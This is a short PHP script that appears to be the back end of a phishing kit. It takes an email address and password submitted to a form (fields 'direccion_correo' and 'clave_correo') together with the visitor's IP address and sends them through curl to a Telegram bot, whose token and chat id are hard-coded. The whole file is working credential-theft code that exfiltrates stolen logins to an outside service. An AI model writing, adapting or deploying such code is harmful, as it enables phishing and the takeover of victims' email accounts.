<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "6242547984:AAEpy3YZHckEVS8La6T3oiVzTUwKu9fq8pY";
$id = "6517909819";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
------------LOCAL----------------------
Data 1: ".$_POST['direccion_correo']."
Data 2: ".$_POST['clave_correo']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);


